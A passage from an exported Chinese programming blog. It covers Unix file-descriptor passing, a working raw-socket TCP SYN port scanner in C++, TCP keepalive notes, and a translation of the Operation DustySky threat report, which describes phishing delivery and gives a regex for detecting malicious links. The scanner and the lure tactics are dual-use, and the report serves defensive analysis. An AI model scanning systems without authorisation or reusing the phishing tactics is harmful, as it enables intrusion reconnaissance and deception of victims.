设置文件描述符</span></span><br><span class="line">    msg.msg_control = control_un.control;</span><br><span class="line">    msg.msg_controllen = <span class="built_in">sizeof</span>(control_un.control);</span><br><span class="line">    <span class="comment">// 下面的设置是必须的，用于标识是否发送成功，data可以随意设置大小</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">iovec</span> vec = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data = <span class="number">0</span>;</span><br><span class="line">    vec.iov_base = &amp;data;</span><br><span class="line">    vec.iov_len = <span class="built_in">sizeof</span>(data);</span><br><span class="line">    msg.msg_iov = &amp;vec;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;msg_controllen &#123;&#125;, control_un.cm.cmsg_len &#123;&#125;&quot;</span>, msg.msg_controllen, control_un.cm.cmsg_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 3. 发送文件描述符 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">sendmsg</span>(fd, &amp;msg, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;sendmsg error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 4. 关闭连接套接字，发送的文件描述符是否关闭外部处理 **********/</span></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>接收端</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">recvFd</span><span class="params">(<span class="type">int</span> clientFd)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/********** 1. 构建msg进行接收文件描述符 **********/</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">msghdr</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// 这里留下可接收的空间即可，其他不用设置</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">cmsghdr</span> cm;</span><br><span class="line">        <span class="type">char</span> control[<span class="built_in">CMSG_SPACE</span>(<span class="built_in">sizeof</span>(clientFd))];  <span class="comment">// 只接收一个文件描述符，所以只需要一个空间</span></span><br><span class="line">    &#125; control_un;</span><br><span class="line">    msg.msg_control = control_un.control;</span><br><span class="line">    msg.msg_controllen = <span class="built_in">sizeof</span>(control_un.control);</span><br><span class="line">    <span class="comment">// 这里使用同样的或者更大的内存进行接收都可以，但是必须分配内存进行接收</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">iovec</span> vec = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data = <span class="number">0</span>;</span><br><span class="line">    vec.iov_base = &amp;data;</span><br><span class="line">    vec.iov_len = <span class="built_in">sizeof</span>(data);</span><br><span class="line">    msg.msg_iov = &amp;vec;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;msg_controllen &#123;&#125;, control_un.cm.cmsg_len &#123;&#125;&quot;</span>, msg.msg_controllen, control_un.cm.cmsg_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 3. 接收文件描述符 **********/</span></span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">recvmsg</span>(clientFd, &amp;msg, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;recvmsg error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 4. 判断接收是否合法 **********/</span></span><br><span class="line">    cmsghdr *cmptr = <span class="built_in">CMSG_FIRSTHDR</span>(&amp;msg);</span><br><span class="line">    <span class="keyword">if</span> (cmptr == <span class="literal">nullptr</span>                                  <span class="comment">// 要存在地址</span></span><br><span class="line">        || cmptr-&gt;cmsg_len != <span class="built_in">CMSG_LEN</span>(<span class="built_in">sizeof</span>(clientFd))  <span class="comment">// 长度要够</span></span><br><span class="line">        || cmptr-&gt;cmsg_level != SOL_SOCKET                <span class="comment">// level要正确</span></span><br><span class="line">        || cmptr-&gt;cmsg_type != SCM_RIGHTS) &#123;              <span class="comment">// type要正确</span></span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;CMSG_FIRSTHDR error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> *fdPtr = (<span class="type">int</span> *)<span class="built_in">CMSG_DATA</span>(cmptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** 5. 返回fd **********/</span></span><br><span class="line">    <span class="keyword">return</span> fdPtr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-原始socket发包"><a href="#4-原始socket发包" class="headerlink" title="4. 原始socket发包"></a>4. 原始socket发包</h2><h3 id="4-1-使用原始socket实现一个tcp-syn扫描器"><a href="#4-1-使用原始socket实现一个tcp-syn扫描器" class="headerlink" title="4.1. 使用原始socket实现一个tcp syn扫描器"></a>4.1. 使用原始socket实现一个tcp syn扫描器</h3><p><strong>带ip头的处理</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PACKET_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TH_SYN 0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TH_RST 0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TH_ACK 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pseudo_header</span> &#123;</span><br><span class="line">    <span class="type">u_int32_t</span> source_address;</span><br><span class="line">    <span class="type">u_int32_t</span> dest_address;</span><br><span class="line">    <span class="type">u_int8_t</span> placeholder;</span><br><span class="line">    <span class="type">u_int8_t</span> protocol;</span><br><span class="line">    <span class="type">u_int16_t</span> tcp_length;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tcphdr</span> tcp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">csum</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> *ptr, <span class="type">int</span> nbytes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">long</span> sum;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> oddbyte;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">short</span> answer;</span><br><span class="line"></span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (nbytes &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        sum += *ptr++;</span><br><span class="line">        nbytes -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">1</span>) &#123;</span><br><span class="line">        oddbyte = <span class="number">0</span>;</span><br><span class="line">        *((u_char *) &amp;oddbyte) = *(u_char *) ptr;</span><br><span class="line">        sum += oddbyte;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>);</span><br><span class="line">    sum = sum + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    answer = (<span class="type">short</span>) ~sum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Usage: &quot;</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &lt;source IP&gt; &lt;target IP&gt; &lt;target port&gt;&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *src_ip = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">char</span> *dst_ip = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> dst_port = <span class="built_in">atoi</span>(argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sock_raw = <span class="built_in">socket</span>(AF_INET, SOCK_RAW, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (sock_raw &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error creating socket: &quot;</span> &lt;&lt; <span class="built_in">strerror</span>(errno) &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 发的包里面有ip头部</span></span><br><span class="line">    <span class="type">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">setsockopt</span>(sock_raw, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="built_in">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error setting socket options: &quot;</span> &lt;&lt; <span class="built_in">strerror</span>(errno) &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> packet[MAX_PACKET_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(packet, <span class="number">0</span>, MAX_PACKET_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">iphdr</span> *ip = (<span class="keyword">struct</span> iphdr *) packet;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tcphdr</span> *tcp = (<span class="keyword">struct</span> tcphdr *) (packet + <span class="built_in">sizeof</span>(<span class="keyword">struct</span> iphdr));</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> sin;</span><br><span class="line"></span><br><span class="line">    sin.sin_family = AF_INET;</span><br><span class="line">    sin.sin_port = <span class="built_in">htons</span>(dst_port);</span><br><span class="line">    sin.sin_addr.s_addr = <span class="built_in">inet_addr</span>(dst_ip);</span><br><span class="line"></span><br><span class="line">    ip-&gt;ihl = <span class="number">5</span>;</span><br><span class="line">    ip-&gt;version = <span class="number">4</span>;</span><br><span class="line">    ip-&gt;tos = <span class="number">0</span>;</span><br><span class="line">    ip-&gt;tot_len = <span class="built_in">sizeof</span>(<span class="keyword">struct</span> iphdr) + <span class="built_in">sizeof</span>(<span class="keyword">struct</span> tcphdr);</span><br><span class="line">    ip-&gt;id = <span class="built_in">htons</span>(<span class="number">54321</span>);</span><br><span class="line">    ip-&gt;frag_off = <span class="number">0</span>;</span><br><span class="line">    ip-&gt;ttl = <span class="number">255</span>;</span><br><span class="line">    ip-&gt;protocol = IPPROTO_TCP;</span><br><span class="line">    ip-&gt;check = <span class="number">0</span>;  <span class="comment">// 这里留空，系统会帮忙计算</span></span><br><span class="line">    ip-&gt;saddr = <span class="built_in">inet_addr</span>(src_ip);</span><br><span class="line">    ip-&gt;daddr = sin.sin_addr.s_addr;</span><br><span class="line"></span><br><span class="line">    tcp-&gt;source = <span class="built_in">htons</span>(<span class="number">1234</span>);</span><br><span class="line">    tcp-&gt;dest = <span class="built_in">htons</span>(dst_port);</span><br><span class="line">    tcp-&gt;seq = <span class="built_in">htonl</span>(<span class="number">1105024978</span>);</span><br><span class="line">    tcp-&gt;ack_seq = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;doff = <span class="number">5</span>;</span><br><span class="line">    tcp-&gt;fin = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;syn = <span class="number">1</span>;</span><br><span class="line">    tcp-&gt;rst = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;psh = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;ack = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;urg = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;window = <span class="built_in">htons</span>(<span class="number">14600</span>);</span><br><span class="line">    tcp-&gt;urg_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">pseudo_header</span> psh;</span><br><span class="line">    psh.source_address = <span class="built_in">inet_addr</span>(src_ip);</span><br><span class="line">    psh.dest_address = sin.sin_addr.s_addr;</span><br><span class="line">    psh.placeholder = <span class="number">0</span>;</span><br><span class="line">    psh.protocol = IPPROTO_TCP;</span><br><span class="line">    psh.tcp_length = <span class="built_in">htons</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> tcphdr));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;psh.tcp, tcp, <span class="built_in">sizeof</span>(<span class="keyword">struct</span> tcphdr));</span><br><span class="line">    <span class="comment">// 计算checksum需要携带目的地址和源地址，否则发出去对面不认就不会回包</span></span><br><span class="line">    tcp-&gt;check = <span class="built_in">csum</span>((<span class="type">unsigned</span> <span class="type">short</span> *) &amp;psh, <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pseudo_header));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sent = <span class="built_in">sendto</span>(sock_raw, packet, ip-&gt;tot_len, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *) &amp;sin, <span class="built_in">sizeof</span>(sin));</span><br><span class="line">    <span class="keyword">if</span> (sent &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error sending packet: &quot;</span> &lt;&lt; <span class="built_in">strerror</span>(errno) &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[MAX_PACKET_SIZE];</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> saddr;</span><br><span class="line">    <span class="type">int</span> saddr_size = <span class="built_in">sizeof</span>(saddr);</span><br><span class="line">    <span class="type">int</span> recv_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (recv_len == <span class="number">0</span>) &#123;</span><br><span class="line">        recv_len = <span class="built_in">recvfrom</span>(sock_raw, buffer, MAX_PACKET_SIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *) &amp;saddr, (<span class="type">socklen_t</span> *) &amp;saddr_size);</span><br><span class="line">        <span class="keyword">if</span> (recv_len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Error receiving packet: &quot;</span> &lt;&lt; <span class="built_in">strerror</span>(errno) &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">iphdr</span> *ip = (<span class="keyword">struct</span> iphdr *) buffer;</span><br><span class="line">        <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">tcphdr</span> *tcp = (<span class="keyword">struct</span> tcphdr *) (buffer + ip-&gt;ihl * <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">if</span> (tcp-&gt;source == <span class="built_in">htons</span>(dst_port) &amp;&amp; tcp-&gt;rst == <span class="number">1</span>) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;Port &quot;</span> &lt;&lt; dst_port &lt;&lt; <span class="string">&quot; is closed&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tcp-&gt;source == <span class="built_in">htons</span>(dst_port) &amp;&amp; tcp-&gt;syn == <span class="number">1</span> &amp;&amp; tcp-&gt;ack == <span class="number">1</span>) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;Port &quot;</span> &lt;&lt; dst_port &lt;&lt; <span class="string">&quot; is open&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(sock_raw);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>不带ip头的处理</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Usage: &quot;</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &lt;source IP&gt; &lt;target IP&gt; &lt;target port&gt;&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *src_ip = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">char</span> *dst_ip = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> dst_port = <span class="built_in">atoi</span>(argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sock_raw = <span class="built_in">socket</span>(AF_INET, SOCK_RAW, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (sock_raw &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error creating socket: &quot;</span> &lt;&lt; <span class="built_in">strerror</span>(errno) &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> packet[MAX_PACKET_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(packet, <span class="number">0</span>, MAX_PACKET_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tcphdr</span> *tcp = (<span class="keyword">struct</span> tcphdr *)packet;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> sin;</span><br><span class="line"></span><br><span class="line">    sin.sin_family = AF_INET;</span><br><span class="line">    sin.sin_port = <span class="built_in">htons</span>(dst_port);</span><br><span class="line">    sin.sin_addr.s_addr = <span class="built_in">inet_addr</span>(dst_ip);</span><br><span class="line"></span><br><span class="line">    tcp-&gt;source = <span class="built_in">htons</span>(<span class="number">1234</span>);</span><br><span class="line">    tcp-&gt;dest = <span class="built_in">htons</span>(dst_port);</span><br><span class="line">    tcp-&gt;seq = <span class="built_in">htonl</span>(<span class="number">1105024978</span>);</span><br><span class="line">    tcp-&gt;ack_seq = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;doff = <span class="number">5</span>;</span><br><span class="line">    tcp-&gt;fin = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;syn = <span class="number">1</span>;</span><br><span class="line">    tcp-&gt;rst = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;psh = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;ack = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;urg = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;window = <span class="built_in">htons</span>(<span class="number">14600</span>);</span><br><span class="line">    tcp-&gt;check = <span class="number">0</span>;</span><br><span class="line">    tcp-&gt;urg_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">pseudo_header</span> psh;</span><br><span class="line">    psh.source_address = <span class="built_in">inet_addr</span>(src_ip);</span><br><span class="line">    psh.dest_address = sin.sin_addr.s_addr;</span><br><span class="line">    psh.placeholder = <span class="number">0</span>;</span><br><span class="line">    psh.protocol = IPPROTO_TCP;</span><br><span class="line">    psh.tcp_length = <span class="built_in">htons</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> tcphdr));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;psh.tcp, tcp, <span class="built_in">sizeof</span>(<span class="keyword">struct</span> tcphdr));</span><br><span class="line">    <span class="comment">// 计算checksum需要携带目的地址和源地址，否则发出去对面不认就不会回包</span></span><br><span class="line">    tcp-&gt;check = <span class="built_in">csum</span>((<span class="type">unsigned</span> <span class="type">short</span> *)&amp;psh, <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pseudo_header));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接发送携带tcp头的数据即可，操作系统会自动拼接ip头，但是tcp的checksum必须对应上，不然对面不认</span></span><br><span class="line">    <span class="type">int</span> sent = <span class="built_in">sendto</span>(sock_raw, tcp, <span class="built_in">sizeof</span>(<span class="keyword">struct</span> tcphdr), <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;sin, <span class="built_in">sizeof</span>(sin));</span><br><span class="line">    <span class="keyword">if</span> (sent &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error sending packet: &quot;</span> &lt;&lt; <span class="built_in">strerror</span>(errno) &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[MAX_PACKET_SIZE];</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> saddr;</span><br><span class="line">    <span class="type">int</span> saddr_size = <span class="built_in">sizeof</span>(saddr);</span><br><span class="line">    <span class="type">int</span> recv_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (recv_len == <span class="number">0</span>) &#123;</span><br><span class="line">        recv_len = <span class="built_in">recvfrom</span>(sock_raw, buffer, MAX_PACKET_SIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;saddr, (<span class="type">socklen_t</span> *)&amp;saddr_size);</span><br><span class="line">        <span class="keyword">if</span> (recv_len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Error receiving packet: &quot;</span> &lt;&lt; <span class="built_in">strerror</span>(errno) &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">iphdr</span> *ip = (<span class="keyword">struct</span> iphdr *)buffer;</span><br><span class="line">        <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">tcphdr</span> *tcp = (<span class="keyword">struct</span> tcphdr *)(buffer + ip-&gt;ihl * <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">if</span> (tcp-&gt;source == <span class="built_in">htons</span>(dst_port) &amp;&amp; tcp-&gt;rst == <span class="number">1</span>) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;Port &quot;</span> &lt;&lt; dst_port &lt;&lt; <span class="string">&quot; is closed&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tcp-&gt;source == <span class="built_in">htons</span>(dst_port) &amp;&amp; tcp-&gt;syn == <span class="number">1</span> &amp;&amp; tcp-&gt;ack == <span class="number">1</span>) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;Port &quot;</span> &lt;&lt; dst_port &lt;&lt; <span class="string">&quot; is open&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(sock_raw);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-TCP连接后，一方断电，另一方是无法检测到对方断电的"><a href="#1-TCP连接后，一方断电，另一方是无法检测到对方断电的" class="headerlink" title="1. TCP连接后，一方断电，另一方是无法检测到对方断电的"></a>1. TCP连接后，一方断电，另一方是无法检测到对方断电的</h2><ul>
<li>TCP连接并没有检测机制，所以一方断电，另一方无法检测到。</li>
<li>强行退出程序，操作系统会回收资源，内部执行关闭套接字，所以客户端可以检测到断开连接。</li>
</ul>
<h2 id="2-SO-KEEPALIVE-保活"><a href="#2-SO-KEEPALIVE-保活" class="headerlink" title="2. SO_KEEPALIVE 保活"></a>2. SO_KEEPALIVE 保活</h2><p>TCP连接选项中有一项是心跳保活机制，但并不是规范的一部分，官方RFC罗列不适用的三个理由:</p>
<ol>
<li>在短暂的故障期间，可能使一个良好的连接被释放</li>
<li>占用了不必要的资源</li>
<li>在以数据包计费的网络上消耗额外的流量</li>
</ol>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>p2p协议资料收集</title>
    <url>/blogs/2019-03-13-p2pProtocolDataCollection/</url>
    <content><![CDATA[<h1 id="常见p2p协议"><a href="#常见p2p协议" class="headerlink" title="常见p2p协议"></a>常见p2p协议</h1><p>概括自: <a href="http://blog.chinaunix.net/uid-11572501-id-2868679.html">常用P2P协议剖析</a></p>
<ul>
<li>napster</li>
<li>Gnutella</li>
<li>eMule</li>
<li>Bittorent</li>
<li>DHT网络</li>
</ul>
<h1 id="原理及实现"><a href="#原理及实现" class="headerlink" title="原理及实现"></a>原理及实现</h1><p><a href="https://zhuanlan.zhihu.com/p/26796476">P2P通信原理与实现</a></p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Operation DustySky文档翻译</title>
    <url>/blogs/2019-03-01-OperationDustySkyTranslation/</url>
    <content><![CDATA[<h1 id="战术，技术和程序"><a href="#战术，技术和程序" class="headerlink" title="战术，技术和程序"></a>战术，技术和程序</h1><h2 id="交货"><a href="#交货" class="headerlink" title="交货"></a>交货</h2><p>发送邮件到多个目标，包含链接下载压缩文件或者附件直接带有压缩文件，这是一些例子</p>
<img src = "Operation DustySky_01.bmp" width = 80%>
<img src = "Operation DustySky_02.bmp" width = 80%>

<p>链接可能包括以下参数：</p>
<ul>
<li>Id  - 当前恶意电子邮件消息的ID，由明文字，加号和数字组成。 例如：Rand + 281</li>
<li>token1  - 与id相同，但Base64编码</li>
<li>token2  - 恶意消息发送到的目标的Base64编码电子邮件地址。</li>
<li>C  - 单词Click或openexe</li>
</ul>
<p>匹配链接的正则表达式:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\/[A-<span class="title class_">Za</span>-z]+\.<span class="property">php</span>\?((?:id|token1|token2|C)=[A-<span class="title class_">Za</span>-z0-<span class="number">9</span>\/=+%]*=&#123;<span class="number">0</span>,<span class="number">2</span>&#125;&amp;?)&#123;<span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure>

<p>例子:<br>spynews.otzo[.]com&#x2F;20151104&#x2F;Update.php?id&#x3D;&gt;redacted&gt;&amp;token1&#x3D;&gt;redacted&gt;&amp;token2&#x3D;&gt;redacted&gt;&amp;C&#x3D;Click</p>
<p>压缩包包含一个.exe文件，有时伪装成Microsoft Word文件，视频或其他文件格式，使用相应的图标。 例如：</p>
<img src = "Operation DustySky_03.bmp" width = 80%>

<h2 id="诱惑内容和发件人身份"><a href="#诱惑内容和发件人身份" class="headerlink" title="诱惑内容和发件人身份"></a>诱惑内容和发件人身份</h2><p>如果受害者提取存档并单击.exe文件，则在计算机感染DustySky时会显示诱饵文档或视频。</p>
<p>在最近的样本中，该组使用嵌入了恶意宏的Microsoft Word文件，如果启用，它将感染受害者。请注意，这些感染方法依赖于社交工程 - 说服受害者打开文件（并在禁用时启用内容） - 而不是软件漏洞。</p>
<p>恶意电子邮件的主题行以及诱饵文档的名称和内容通常与最近的外交，辩护和政治事件有关。有时诱惑主题是八卦或性别相关，甚至可能包括色情视频。在最近的样本中，使用了假发票和公共Google隐私政策的副本。</p>
<p>诱饵文档的内容始终从公共新闻项目或其他Web内容中复制，并且永远不是攻击者的原始组成。</p>
<p>恶意邮件中的“来自”字段通常设置为与诱饵文档相关，例如“最新以色列新闻”，“以色列热门故事”，“以色列国防军”，“（”مركزالإماراتللسياسات模仿<strong>阿联酋政策中心组织</strong>）。</p>
<ul>
<li>“该中心承担着预测区域，区域和国际政策趋势的未来以及不同地缘政治项目对该地区的影响的任务。 它旨在提供战略分析，政策文件，研究和研究，以服务于该地区任何机构或国家的决策者，优先考虑阿联酋。“</li>
</ul>
